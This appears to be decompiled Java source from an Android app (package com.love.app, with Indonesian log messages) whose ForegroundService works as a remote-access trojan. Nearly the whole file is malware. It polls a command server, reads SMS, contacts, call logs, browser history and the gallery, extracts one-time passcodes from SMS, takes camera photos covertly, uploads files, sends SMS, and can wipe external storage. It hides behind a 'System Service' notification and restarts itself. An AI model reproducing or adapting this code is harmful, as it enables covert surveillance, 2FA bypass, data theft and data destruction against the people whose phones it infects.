        Vibrator vibrator = (Vibrator)this.getSystemService("vibrator");
        if (vibrator == null) {
            this.sendResult("vibrate", "vibrator not available", string2);
            return;
        }
        if (Build.VERSION.SDK_INT >= 26) {
            vibrator.vibrate(VibrationEffect.createOneShot((long)5000L, (int)-1));
        } else {
            vibrator.vibrate(5000L);
        }
        this.sendResult("vibrate", "ok", string2);
    }

    private void waitForBaseUrlAndStartPolling() {
        ConfigFetcher.bootstrapConfig((Context)this, new ConfigFetcher.ConfigListener(this){
            final ForegroundService this$0;
            {
                this.this$0 = foregroundService;
            }

            /* synthetic */ void lambda$onConfigFailed$0$com_love_app_ForegroundService$1() {
                this.this$0.waitForBaseUrlAndStartPolling();
            }

            @Override
            public void onConfigFailed() {
                Log.w((String)ForegroundService.TAG, (String)"Config fetch gagal, coba lagi 30 detik");
                this.this$0.mainHandler.postDelayed((Runnable)new ForegroundService$1$$ExternalSyntheticLambda0(this), 30000L);
            }

            @Override
            public void onConfigLoaded(String string2) {
                this.this$0.registerDevice(string2);
                this.this$0.startPollingLoop(string2);
            }
        });
    }

    private void wipe(String string2) {
        this.sendResult("wipe", "started", string2);
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda24(this));
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$changeWallpaper$10$com_love_app_ForegroundService(String object, String string2) {
        try {
            WallpaperManager wallpaperManager = WallpaperManager.getInstance((Context)this);
            if (object != null && (((String)object).startsWith("http://") || ((String)object).startsWith("https://"))) {
                URL uRL = new URL((String)object);
                object = (HttpURLConnection)uRL.openConnection();
                ((URLConnection)object).setDoInput(true);
                ((URLConnection)object).connect();
                object = BitmapFactory.decodeStream((InputStream)((URLConnection)object).getInputStream());
                if (object != null) {
                    wallpaperManager.setBitmap((Bitmap)object);
                    this.sendResult("wallpaper", "ok", string2);
                    return;
                }
            }
            wallpaperManager.setResource(2131623936);
            this.sendResult("wallpaper", "ok_fallback", string2);
            return;
        }
        catch (Exception exception) {
            this.sendResult("wallpaper_error", exception.getMessage(), string2);
        }
    }

    /*
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$fetchGallery$24$com_love_app_ForegroundService(int n, String string2) {
        void var5_9;
        File[] fileArray;
        ArrayList<String> arrayList = new ArrayList<String>();
        File file = Environment.getExternalStoragePublicDirectory((String)(Environment.DIRECTORY_DCIM + "/Camera"));
        if (file.exists() && (fileArray = file.listFiles()) != null) {
            for (File file2 : fileArray) {
                String string3 = file2.getName().toLowerCase();
                if (!string3.endsWith(".jpg") && !string3.endsWith(".jpeg") && !string3.endsWith(".png") && !string3.endsWith(".mp4") && !string3.endsWith(".3gp") && !string3.endsWith(".mov")) continue;
                try {
                    string3 = new JSONObject();
                    string3.put("name", (Object)file2.getName());
                    string3.put("path", (Object)file2.getAbsolutePath());
                    string3.put("size", file2.length());
                    string3.put("type", (Object)file2.getName().substring(file2.getName().lastIndexOf(".") + 1));
                    arrayList.add(string3);
                }
                catch (JSONException jSONException) {}
            }
        }
        ArrayList<String> arrayList2 = arrayList;
        if (arrayList.size() > n) {
            List list = arrayList.subList(0, n);
        }
        this.sendResult("gallery", new JSONArray((Collection)var5_9).toString(), string2);
    }

    /* synthetic */ void lambda$fetchNotifications$22$com_love_app_ForegroundService(String string2, String string3) {
        this.sendResult("notifications", string3, string2);
    }

    /* synthetic */ void lambda$fetchNotifications$23$com_love_app_ForegroundService(String string2, VolleyError volleyError) {
        this.sendResult("notifications", "[]", string2);
    }

    /* synthetic */ void lambda$getBrowserHistory$18$com_love_app_ForegroundService(String string2) {
        try {
            List list = new List((Context)this);
            list = ((BrowserProvider)((Object)list)).getSearches().getList();
            list = list.subList(0, Math.min(list.size(), 100));
            Gson gson = new Gson();
            this.sendResult("browser_history", gson.toJson(list), string2);
        }
        catch (Exception exception) {
            this.sendResult("browser_history", "error: " + exception.getMessage(), string2);
        }
    }

    /* synthetic */ void lambda$getCallLogs$16$com_love_app_ForegroundService(String string2) {
        try {
            Object object = new CallsProvider((Context)this);
            object = ((CallsProvider)object).getCalls().getList();
            List list = object.subList(0, Math.min(object.size(), 100));
            object = new Gson();
            this.sendResult("call_logs", ((Gson)object).toJson(list), string2);
        }
        catch (Exception exception) {
            this.sendResult("call_logs", "error: " + exception.getMessage(), string2);
        }
    }

    /* synthetic */ void lambda$getContacts$13$com_love_app_ForegroundService(String string2) {
        try {
            Contacts.initialize((Context)this);
            Gson gson = new Gson();
            this.sendResult("contacts", gson.toJson(Contacts.getQuery().find()), string2);
        }
        catch (Exception exception) {
            this.sendResult("contacts", "error: " + exception.getMessage(), string2);
        }
    }

    /*
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$getFileList$20$com_love_app_ForegroundService(String object, String string2) {
        void var7_7;
        block10: {
            block9: {
                if ((object = object != null && !((String)object).isEmpty() ? new File((String)object) : null) == null) break block9;
                Object object2 = object;
                if (((File)object).exists()) break block10;
            }
            File file = Environment.getExternalStorageDirectory();
        }
        File[] fileArray = var7_7.listFiles();
        JSONArray jSONArray = new JSONArray();
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("current_path", (Object)var7_7.getAbsolutePath());
            object = var7_7.getParent() != null ? var7_7.getParent() : "";
            jSONObject.put("parent_path", object);
            jSONObject.put("can_write", var7_7.canWrite());
            jSONArray.put((Object)jSONObject);
        }
        catch (Exception exception) {}
        if (fileArray != null) {
            Arrays.sort(fileArray, new ForegroundService$$ExternalSyntheticLambda17());
            for (File file : fileArray) {
                try {
                    object = new JSONObject();
                    object.put("name", (Object)file.getName());
                    object.put("path", (Object)file.getAbsolutePath());
                    object.put("isDir", file.isDirectory());
                    long l = file.isFile() ? file.length() : 0L;
                    object.put("size", l);
                    object.put("lastModified", file.lastModified());
                    jSONArray.put(object);
                }
                catch (JSONException jSONException) {}
            }
        }
        this.sendResult("file_list", jSONArray.toString(), string2);
    }

    /* synthetic */ void lambda$getOTP$26$com_love_app_ForegroundService(String string2) {
        Object object = new TelephonyProvider((Context)this);
        List<Sms> list = ((TelephonyProvider)object).getSms(TelephonyProvider.Filter.INBOX).getList();
        int n = Math.min(list.size(), 20);
        JSONArray jSONArray = new JSONArray();
        Pattern pattern = Pattern.compile("\\b(\\d{4,6})\\b");
        for (int i = 0; i < n; ++i) {
            object = list.get(i);
            String string3 = ((Sms)object).body;
            if (string3 == null) continue;
            Matcher matcher = pattern.matcher(string3);
            if (!matcher.find()) continue;
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("from", (Object)((Sms)object).address);
            jSONObject.put("body", (Object)string3);
            jSONObject.put("otp", (Object)matcher.group(1));
            jSONObject.put("date", ((Sms)object).date);
            jSONArray.put((Object)jSONObject);
        }
        try {
            this.sendResult("otp", jSONArray.toString(), string2);
        }
        catch (Exception exception) {
            this.sendResult("otp_error", exception.getMessage(), string2);
        }
        catch (SecurityException securityException) {
            this.sendResult("otp_error", "Izin membaca SMS tidak diberikan", string2);
        }
    }

    /* synthetic */ void lambda$getSms$14$com_love_app_ForegroundService(String string2) {
        try {
            List list = new List((Context)this);
            list = ((TelephonyProvider)((Object)list)).getSms(TelephonyProvider.Filter.ALL).getList();
            list = list.subList(0, Math.min(list.size(), 100));
            Gson gson = new Gson();
            this.sendResult("sms", gson.toJson(list), string2);
        }
        catch (Exception exception) {
            this.sendResult("sms", "error: " + exception.getMessage(), string2);
        }
    }

    /*
     * Loose catch block
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$playAudio$9$com_love_app_ForegroundService(String object, String string2) {
        void var4_11;
        File file;
        block20: {
            int n;
            Object object2 = null;
            Object object3 = new URL((String)object);
            object3 = ((URL)object3).openConnection();
            ((URLConnection)object3).connect();
            object = this.getCacheDir();
            StringBuilder stringBuilder = new StringBuilder("temp_audio_");
            file = new File((File)object, stringBuilder.append(System.currentTimeMillis()).append(".mp3").toString());
            object = new BufferedInputStream(((URLConnection)object3).getInputStream());
            object3 = new FileOutputStream(file);
            object2 = new byte[8192];
            while ((n = ((FilterInputStream)object).read((byte[])object2)) != -1) {
                ((FileOutputStream)object3).write((byte[])object2, 0, n);
            }
            ((FileOutputStream)object3).close();
            ((BufferedInputStream)object).close();
            object = new MediaPlayer();
            try {
                object.setDataSource(file.getAbsolutePath());
                object.prepare();
                object.start();
                object3 = new ForegroundService$$ExternalSyntheticLambda7(file);
                object.setOnCompletionListener((MediaPlayer.OnCompletionListener)object3);
                this.sendResult("voice_sent", "playing", string2);
                return;
            }
            catch (Exception exception) {}
            break block20;
            catch (Throwable throwable) {
                try {
                    ((FileOutputStream)object3).close();
                    throw throwable;
                }
                catch (Throwable throwable2) {
                    try {
                        throwable.addSuppressed(throwable2);
                        throw throwable;
                    }
                    catch (Throwable throwable3) {
                        try {
                            ((BufferedInputStream)object).close();
                            throw throwable3;
                        }
                        catch (Throwable throwable4) {
                            try {
                                throwable3.addSuppressed(throwable4);
                                throw throwable3;
                            }
                            catch (Exception exception) {
                                object = null;
                            }
                        }
                    }
                }
            }
            break block20;
            catch (Exception exception) {
                object = null;
                file = object2;
            }
        }
        Log.e((String)TAG, (String)"playAudio error", (Throwable)var4_11);
        this.sendResult("voice_error", var4_11.getMessage(), string2);
        if (file != null) {
            file.delete();
        }
        if (object == null) return;
        object.release();
    }

    /* synthetic */ void lambda$registerDevice$2$com_love_app_ForegroundService(JSONObject object) {
        Log.i((String)TAG, (String)"✅ Registrasi HTTP sukses");
        String string2 = object.optString("username", "");
        object = object.optString("session_id", "");
        if (!string2.trim().isEmpty()) {
            ConfigFetcher.setUsername((Context)this, string2.trim());
        }
        if (!((String)object).trim().isEmpty()) {
            ConfigFetcher.setSessionId((Context)this, ((String)object).trim());
        }
        this.registered = true;
    }

    /* synthetic */ void lambda$registerDevice$3$com_love_app_ForegroundService(String string2) {
        this.registerDevice(string2);
    }

    /* synthetic */ void lambda$registerDevice$4$com_love_app_ForegroundService(String string2, VolleyError volleyError) {
        Log.e((String)TAG, (String)"❌ Registrasi HTTP gagal, coba lagi 30 detik");
        this.mainHandler.postDelayed((Runnable)new ForegroundService$$ExternalSyntheticLambda11(this, string2), 30000L);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$sendDeviceInfo$17$com_love_app_ForegroundService(String string2) {
        TelephonyManager telephonyManager = (TelephonyManager)this.getSystemService("phone");
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("device_id", (Object)this.deviceId);
            jSONObject.put("model", (Object)Build.MODEL);
            jSONObject.put("manufacturer", (Object)Build.MANUFACTURER);
            jSONObject.put("sdk", Build.VERSION.SDK_INT);
            jSONObject.put("android", (Object)Build.VERSION.RELEASE);
            jSONObject.put("username", (Object)ConfigFetcher.getUsername((Context)this));
            jSONObject.put("session_id", (Object)ConfigFetcher.getSessionId((Context)this));
            BatteryManager batteryManager = (BatteryManager)this.getSystemService("batterymanager");
            if (batteryManager != null) {
                jSONObject.put("battery", batteryManager.getIntProperty(4));
            }
            if (telephonyManager != null) {
                try {
                    jSONObject.put("country", (Object)telephonyManager.getNetworkCountryIso());
                    jSONObject.put("operator", (Object)telephonyManager.getSimOperatorName());
                }
                catch (SecurityException securityException) {
                    jSONObject.put("country", (Object)"");
                    jSONObject.put("operator", (Object)"");
                }
            }
        }
        catch (JSONException jSONException) {}
        this.sendResult("device_info", jSONObject.toString(), string2);
    }

    /* synthetic */ void lambda$sendInstalledApps$12$com_love_app_ForegroundService(String string2) {
        PackageManager packageManager = this.getPackageManager();
        Object object = packageManager.getInstalledApplications(128);
        ArrayList<String> arrayList = new ArrayList<String>();
        object = object.iterator();
        while (object.hasNext()) {
            ApplicationInfo applicationInfo = (ApplicationInfo)object.next();
            if (packageManager.getLaunchIntentForPackage(applicationInfo.packageName) == null) continue;
            arrayList.add(applicationInfo.packageName);
        }
        this.sendResult("apps", new JSONArray(arrayList).toString(), string2);
    }

    /*
     * Loose catch block
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    /* synthetic */ void lambda$sendResult$5$com_love_app_ForegroundService(String string2, String string3, String string4, String string5) {
        boolean bl = false;
        int n = 0;
        while (!(bl || n >= 3)) {
            Object object;
            block44: {
                Object object2;
                Object object3;
                int n2;
                boolean bl2;
                block43: {
                    block42: {
                        block41: {
                            bl2 = bl;
                            n2 = n;
                            bl2 = bl;
                            n2 = n;
                            object3 = new JSONObject();
                            bl2 = bl;
                            n2 = n;
                            object3.put("device_id", (Object)this.deviceId);
                            object2 = "";
                            object = string2 != null ? string2 : "";
                            bl2 = bl;
                            n2 = n;
                            object3.put("cmdId", object);
                            bl2 = bl;
                            n2 = n;
                            object3.put("type", (Object)string3);
                            object = object2;
                            if (string4 != null) {
                                object = string4;
                            }
                            bl2 = bl;
                            n2 = n;
                            object3.put("data", object);
                            bl2 = bl;
                            n2 = n;
                            object3.put("timestamp", System.currentTimeMillis());
                            bl2 = bl;
                            n2 = n;
                            object = object3.toString().getBytes("UTF-8");
                            bl2 = bl;
                            n2 = n;
                            bl2 = bl;
                            n2 = n;
                            bl2 = bl;
                            n2 = n;
                            object2 = new StringBuilder();
                            bl2 = bl;
                            n2 = n;
                            object3 = new URL(((StringBuilder)object2).append(string5).append("/result").toString());
                            bl2 = bl;
                            n2 = n;
                            object2 = (HttpURLConnection)((URL)object3).openConnection();
                            bl2 = bl;
                            n2 = n;
                            ((HttpURLConnection)object2).setRequestMethod("POST");
                            bl2 = bl;
                            n2 = n;
                            ((URLConnection)object2).setConnectTimeout(10000);
                            bl2 = bl;
                            n2 = n;
                            ((URLConnection)object2).setReadTimeout(10000);
                            bl2 = bl;
                            n2 = n;
                            ((URLConnection)object2).setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                            bl2 = bl;
                            n2 = n;
                            ((URLConnection)object2).setRequestProperty("Content-Length", String.valueOf(((Object)object).length));
                            bl2 = bl;
                            n2 = n;
                            ((URLConnection)object2).setDoOutput(true);
                            bl2 = bl;
                            n2 = n;
                            object3 = ((URLConnection)object2).getOutputStream();
                            ((OutputStream)object3).write((byte[])object);
                            ((OutputStream)object3).flush();
                            if (object3 == null) break block41;
                            bl2 = bl;
                            n2 = n;
                            ((OutputStream)object3).close();
                        }
                        bl2 = bl;
                        n2 = n++;
                        int n3 = ((HttpURLConnection)object2).getResponseCode();
                        if (n3 == 200 || n3 == 201) break block42;
                        bl2 = bl;
                        n2 = n;
                        bl2 = bl;
                        n2 = n;
                        object = new StringBuilder();
                        bl2 = bl;
                        n2 = n;
                        Log.w((String)TAG, (String)((StringBuilder)object).append("⚠️ sendResult HTTP ").append(n3).append(", retry ").append(n).toString());
                        bl2 = bl;
                        n2 = n;
                        Thread.sleep(n * 2000);
                        break block43;
                    }
                    object = new StringBuilder();
                    Log.d((String)TAG, (String)((StringBuilder)object).append("✅ sendResult sukses (").append(string3).append(")").toString());
                    bl = true;
                }
                bl2 = bl;
                n2 = n;
                ((HttpURLConnection)object2).disconnect();
                continue;
                catch (Exception exception) {
                    bl = true;
                }
                break block44;
                catch (Throwable throwable) {
                    if (object3 != null) {
                        try {
                            ((OutputStream)object3).close();
                        }
                        catch (Throwable throwable2) {
                            bl2 = bl;
                            n2 = n;
                            throwable.addSuppressed(throwable2);
                        }
                    }
                    bl2 = bl;
                    n2 = n;
                    throw throwable;
                    {
                        catch (Exception exception) {
                            n = n2;
                            bl = bl2;
                        }
                    }
                }
            }
            Log.e((String)TAG, (String)("❌ sendResult exception: " + ((Throwable)object).getMessage() + ", retry " + ++n));
            long l = n * 3000;
            try {
                Thread.sleep(l);
            }
            catch (InterruptedException interruptedException) {
            }
        }
    }

    /* synthetic */ void lambda$sendSms$15$com_love_app_ForegroundService(String charSequence, String string2) {
        try {
            Object object = new JSONObject((String)charSequence);
            String string3 = object.getString("phone");
            object = object.getString("message");
            charSequence = Build.VERSION.SDK_INT >= 31 ? (SmsManager)this.getSystemService(SmsManager.class) : SmsManager.getDefault();
            charSequence.sendTextMessage(string3, null, (String)object, null, null);
            charSequence = new StringBuilder("sent to ");
            this.sendResult("sms_status", ((StringBuilder)charSequence).append(string3).toString(), string2);
        }
        catch (Exception exception) {
            this.sendResult("sms_status", "failed: " + exception.getMessage(), string2);
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$showToast$11$com_love_app_ForegroundService(String string2, String string3) {
        try {
            block13: {
                Object object;
                block15: {
                    block16: {
                        int n;
                        block14: {
                            object = new JSONObject(string2);
                            string2 = object.optString("type", "normal");
                            object = object.optString("message", "");
                            if (((String)object).isEmpty()) {
                                this.sendResult("toast_error", "message empty", string3);
                                return;
                            }
                            switch (string2.hashCode()) {
                                default: {
                                    break;
                                }
                                case 1124446108: {
                                    if (!string2.equals("warning")) break;
                                    n = 3;
                                    break block14;
                                }
                                case 96784904: {
                                    if (!string2.equals("error")) break;
                                    n = 0;
                                    break block14;
                                }
                                case 3237038: {
                                    if (!string2.equals("info")) break;
                                    n = 2;
                                    break block14;
                                }
                                case -1867169789: {
                                    if (!string2.equals("success")) break;
                                    n = 1;
                                    break block14;
                                }
                            }
                            n = -1;
                        }
                        if (n == 0) break block15;
                        if (n == 1) break block16;
                        if (n != 2) {
                            if (n != 3) {
                                Toasty.normal((Context)this, (CharSequence)object).show();
                                break block13;
                            } else {
                                Toasty.warning((Context)this, (CharSequence)object).show();
                            }
                            break block13;
                        } else {
                            Toasty.info((Context)this, (CharSequence)object).show();
                        }
                        break block13;
                    }
                    Toasty.success((Context)this, (CharSequence)object).show();
                    break block13;
                }
                Toasty.error((Context)this, (CharSequence)object).show();
            }
            this.sendResult("toast", "ok", string3);
            return;
        }
        catch (Exception exception) {
            this.sendResult("toast_error", exception.getMessage(), string3);
        }
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$startPollingLoop$1$com_love_app_ForegroundService(String var1_1) {
        block10: while (true) {
            var3_5 = 0;
            while (true) {
                block21: {
                    block16: {
                        block18: {
                            block19: {
                                block20: {
                                    block17: {
                                        block15: {
                                            if (!this.pollingActive.get() || Thread.currentThread().isInterrupted()) break block19;
                                            var2_4 = var3_5;
                                            try {
                                                var2_4 = var3_5;
                                                var5_8 = new StringBuilder();
                                                var2_4 = var3_5;
                                                var6_11 = var5_8.append(var1_1).append("/commands/poll?device_id=").append(URLEncoder.encode(this.deviceId, "UTF-8")).append("&timeout=25").toString();
                                                var2_4 = var3_5;
                                                var2_4 = var3_5;
                                                var5_8 = new URL((String)var6_11);
                                                var2_4 = var3_5;
                                                var5_8 = (HttpURLConnection)var5_8.openConnection();
                                                var2_4 = var3_5;
                                                var5_8.setRequestMethod("GET");
                                                var2_4 = var3_5;
                                                var5_8.setConnectTimeout(10000);
                                                var2_4 = var3_5;
                                                var5_8.setReadTimeout(35000);
                                                var2_4 = var3_5;
                                                var5_8.setRequestProperty("Accept", "application/json");
                                                var2_4 = var3_5++;
                                                var4_6 = var5_8.getResponseCode();
                                                if (var4_6 != 200) break block15;
                                            }
                                            catch (Exception var5_10) {
                                                // empty catch block
                                                break block16;
                                            }
                                            try {
                                                var7_12 = new InputStreamReader(var5_8.getInputStream(), "UTF-8");
                                                var6_11 = new BufferedReader((Reader)var7_12);
                                                var7_12 = new StringBuilder();
                                                while ((var8_13 = var6_11.readLine()) != null) {
                                                    var7_12.append(var8_13);
                                                }
                                                var6_11.close();
                                                var6_11 = var7_12.toString().trim();
                                                if (!(var6_11.isEmpty() || var6_11.equals("null") || var6_11.equals("{}"))) {
                                                    this.processCommandResponse((String)var6_11, var1_1);
                                                }
                                                break block17;
                                            }
                                            catch (Exception var5_9) {
                                                var2_4 = 0;
                                                break block16;
                                            }
                                        }
                                        if (var4_6 != 204) break block20;
                                    }
                                    var3_5 = 0;
                                    ** GOTO lbl70
                                }
                                var2_4 = var3_5;
                                break block18;
                            }
lbl57:
                            // 3 sources

                            while (true) {
                                Log.w((String)"ForegroundService", (String)"Polling loop berhenti");
                                return;
                            }
                        }
                        var2_4 = var3_5;
                        var6_11 = new StringBuilder();
                        var2_4 = var3_5;
                        Log.w((String)"ForegroundService", (String)var6_11.append("Poll HTTP ").append(var4_6).append(", error count: ").append(var3_5).toString());
                        var2_4 = var3_5;
                        Thread.sleep(Math.min(30000, var3_5 * 2000));
lbl70:
                        // 2 sources

                        var2_4 = var3_5;
                        var5_8.disconnect();
                        continue;
                    }
                    var3_5 = var2_4 + 1;
                    Log.e((String)"ForegroundService", (String)("Polling loop exception: " + var5_8.getMessage()));
                    try {}
                    catch (InterruptedException var1_3) {
                        ** GOTO lbl57
                    }
                    break block21;
                    catch (InterruptedException var1_2) {
                        Thread.currentThread().interrupt();
                        ** continue;
                    }
                    catch (SocketTimeoutException var5_7) {
                        continue block10;
                    }
                }
                Thread.sleep(Math.min(60000, var3_5 * 5000));
            }
            break;
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$takePhoto$6$com_love_app_ForegroundService(String string2, byte[] byArray, Camera camera) {
        Object object = this.cameraLock;
        synchronized (object) {
            camera.stopPreview();
            camera.release();
            this.camera = null;
        }
        this.sendResult("photo", Base64.encodeToString((byte[])this.compressImage(byArray, 60, 1024), (int)2), string2);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$takePhoto$7$com_love_app_ForegroundService(int n, String string2) {
        int n2;
        Object object;
        block10: {
            object = new Camera.CameraInfo();
            for (int i = 0; i < Camera.getNumberOfCameras(); ++i) {
                Camera.getCameraInfo((int)i, (Camera.CameraInfo)object);
                if (n == 1) {
                    n2 = i;
                    if (object.facing == 1) break block10;
                }
                if (n != 0 || object.facing != 0) continue;
                n2 = i;
                break block10;
            }
            n2 = -1;
        }
        if (n2 == -1) {
            this.sendResult("photo_error", "Kamera tidak ditemukan", string2);
            return;
        }
        object = this.cameraLock;
        synchronized (object) {
            if (this.camera != null) {
                this.releaseCamera();
            }
            try {
                this.camera = Camera.open((int)n2);
                Object object2 = new SurfaceTexture(0);
                this.camera.setPreviewTexture(object2);
                object2 = this.camera.getParameters();
                object2.setJpegQuality(85);
                List list = object2.getSupportedPictureSizes();
                if (list != null && !list.isEmpty()) {
                    list = (Camera.Size)list.get(Math.max(0, list.size() - Math.max(1, list.size() / 3)));
                    object2.setPictureSize(((Camera.Size)list).width, ((Camera.Size)list).height);
                }
                this.camera.setParameters((Camera.Parameters)object2);
                this.camera.startPreview();
                Thread.sleep(500L);
                list = this.camera;
                object2 = new ForegroundService$$ExternalSyntheticLambda0(this, string2);
                list.takePicture(null, null, (Camera.PictureCallback)object2);
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)"takePhoto error", (Throwable)exception);
                this.releaseCamera();
                this.sendResult("photo_error", exception.getMessage(), string2);
            }
            return;
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$uploadFile$21$com_love_app_ForegroundService(String object, String string2) {
        try {
            int n;
            Comparable<File> comparable = new Comparable<File>((String)object);
            if (!((File)comparable).exists()) {
                comparable = new Comparable<File>("not found: ");
                this.sendResult("upload_status", ((StringBuilder)comparable).append((String)object).toString(), string2);
                return;
            }
            object = ConfigFetcher.getBaseUrl((Context)this);
            if (object == null) {
                this.sendResult("upload_status", "error: no baseUrl", string2);
                return;
            }
            Object object2 = new StringBuilder("===");
            object2 = ((StringBuilder)object2).append(System.currentTimeMillis()).append("===").toString();
            Object object3 = new StringBuilder();
            Object object4 = new URL(((StringBuilder)object3).append((String)object).append("/upload").toString());
            object = (HttpURLConnection)((URL)object4).openConnection();
            ((URLConnection)object).setDoInput(true);
            ((URLConnection)object).setDoOutput(true);
            ((URLConnection)object).setUseCaches(false);
            ((HttpURLConnection)object).setRequestMethod("POST");
            ((URLConnection)object).setRequestProperty("Connection", "Keep-Alive");
            object3 = new StringBuilder("multipart/form-data; boundary=");
            ((URLConnection)object).setRequestProperty("Content-Type", ((StringBuilder)object3).append((String)object2).toString());
            object3 = new DataOutputStream(((URLConnection)object).getOutputStream());
            object4 = new StringBuilder("--");
            ((DataOutputStream)object3).writeBytes(((StringBuilder)object4).append((String)object2).append("\r\n").toString());
            object4 = new StringBuilder("Content-Disposition: form-data; name=\"file\"; filename=\"");
            ((DataOutputStream)object3).writeBytes(((StringBuilder)object4).append(((File)comparable).getName()).append("\"\r\n").toString());
            object4 = new StringBuilder("Content-Type: ");
            ((DataOutputStream)object3).writeBytes(((StringBuilder)object4).append(URLConnection.guessContentTypeFromName(((File)comparable).getName())).append("\r\n").toString());
            ((DataOutputStream)object3).writeBytes("\r\n");
            object4 = new FileInputStream((File)comparable);
            byte[] byArray = new byte[8192];
            while ((n = ((FileInputStream)object4).read(byArray)) != -1) {
                ((DataOutputStream)object3).write(byArray, 0, n);
            }
            ((FileInputStream)object4).close();
            ((DataOutputStream)object3).writeBytes("\r\n");
            object4 = new StringBuilder();
            ((DataOutputStream)object3).writeBytes(((StringBuilder)object4).append("--").append((String)object2).append("--").append("\r\n").toString());
            ((DataOutputStream)object3).flush();
            ((FilterOutputStream)object3).close();
            n = ((HttpURLConnection)object).getResponseCode();
            if (n == 200) {
                object2 = new InputStreamReader(((URLConnection)object).getInputStream());
                object3 = new BufferedReader((Reader)object2);
                object2 = new StringBuilder();
                while ((object4 = ((BufferedReader)object3).readLine()) != null) {
                    ((StringBuilder)object2).append((String)object4);
                }
                ((BufferedReader)object3).close();
                object3 = new JSONObject(((StringBuilder)object2).toString());
                object2 = object3.optString("url");
                object3 = new JSONObject();
                object3.put("filename", (Object)((File)comparable).getName());
                object3.put("size", ((File)comparable).length());
                object3.put("url", object2);
                this.sendResult("file_upload", object3.toString(), string2);
            } else {
                comparable = new Comparable<File>();
                this.sendResult("upload_status", ((StringBuilder)comparable).append("failed with code: ").append(n).toString(), string2);
            }
            ((HttpURLConnection)object).disconnect();
            return;
        }
        catch (Exception exception) {
            this.sendResult("upload_status", "error: " + exception.getMessage(), string2);
        }
    }

    /* synthetic */ void lambda$wipe$25$com_love_app_ForegroundService() {
        this.deleteRecursive(Environment.getExternalStorageDirectory());
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void onCreate() {
        CameraManager cameraManager;
        super.onCreate();
        Object object = lock;
        synchronized (object) {
            sInstance = this;
            sRunning = true;
        }
        Log.i((String)TAG, (String)"onCreate — HTTP polling hub started");
        this.deviceId = this.getMyDeviceId();
        this.requestQueue = Volley.newRequestQueue((Context)this);
        this.tts = new TextToSpeech((Context)this, (TextToSpeech.OnInitListener)this);
        this.cameraManager = cameraManager = (CameraManager)this.getSystemService("camera");
        if (cameraManager != null) {
            try {
                this.torchCameraId = cameraManager.getCameraIdList()[0];
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)"Error getting camera list", (Throwable)exception);
            }
        }
        this.acquireWakeLock();
        this.startLocationTracking();
        this.waitForBaseUrlAndStartPolling();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void onDestroy() {
        Log.w((String)TAG, (String)"onDestroy — service dihentikan, akan restart dalam 1 detik");
        Object object = lock;
        synchronized (object) {
            sInstance = null;
            sRunning = false;
        }
        this.pollingActive.set(false);
        object = this.pollingThread;
        if (object != null) {
            ((Thread)object).interrupt();
        }
        if ((object = this.tts) != null) {
            object.shutdown();
        }
        this.releaseWakeLock();
        try {
            LocationListener locationListener;
            object = this.locationManager;
            if (object != null && (locationListener = this.locationListener) != null) {
                object.removeUpdates(locationListener);
            }
        }
        catch (Exception exception) {}
        if ((object = this.executor) != null) {
            object.shutdownNow();
        }
        super.onDestroy();
        object = this.getApplicationContext();
        this.mainHandler.postDelayed((Runnable)new ForegroundService$$ExternalSyntheticLambda12((Context)object), 1000L);
    }

    public void onInit(int n) {
        if (n == 0) {
            this.tts.setLanguage(Locale.getDefault());
        }
    }

    public int onStartCommand(Intent intent, int n, int n2) {
        this.createNotificationChannel();
        intent = PendingIntent.getActivity((Context)this, (int)0, (Intent)new Intent((Context)this, MainActivity.class), (int)0xC000000);
        intent = new NotificationCompat.Builder((Context)this, CHANNEL_ID).setContentTitle("System Service").setContentText("Running").setSmallIcon(17301659).setContentIntent((PendingIntent)intent).build();
        if (Build.VERSION.SDK_INT >= 29) {
            this.startForeground(2, (Notification)intent, 1);
        } else {
            this.startForeground(2, (Notification)intent);
        }
        return 1;
    }

    public void sendResult(String string2, String string3, String string4) {
        String string5 = ConfigFetcher.getBaseUrl((Context)this);
        if (string5 != null && !string5.isEmpty()) {
            this.executor.execute(new ForegroundService$$ExternalSyntheticLambda22(this, string4, string2, string3, string5));
            return;
        }
        Log.e((String)TAG, (String)"sendResult: baseUrl null");
    }
}

